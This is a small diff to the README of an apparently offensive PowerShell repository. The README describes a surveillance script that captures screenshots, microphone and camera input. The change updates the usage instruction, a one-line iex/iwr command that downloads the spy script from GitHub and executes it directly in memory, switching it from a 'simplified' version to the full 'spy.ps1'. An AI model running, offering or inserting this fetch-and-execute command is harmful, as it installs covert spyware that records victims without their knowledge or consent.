@@ -21,7 +21,7 @@ A PowerShell surveillance script that captures screenshots, microphone and camer
 
 Download or clone this repository and run the script with PowerShell:
 ```powershell
-iex((iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/spider_spy/spy_simplified.ps1).content)
+iex((iwr -uri https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/spider_spy/spy.ps1).content)
 ```
 
 ### Parameters
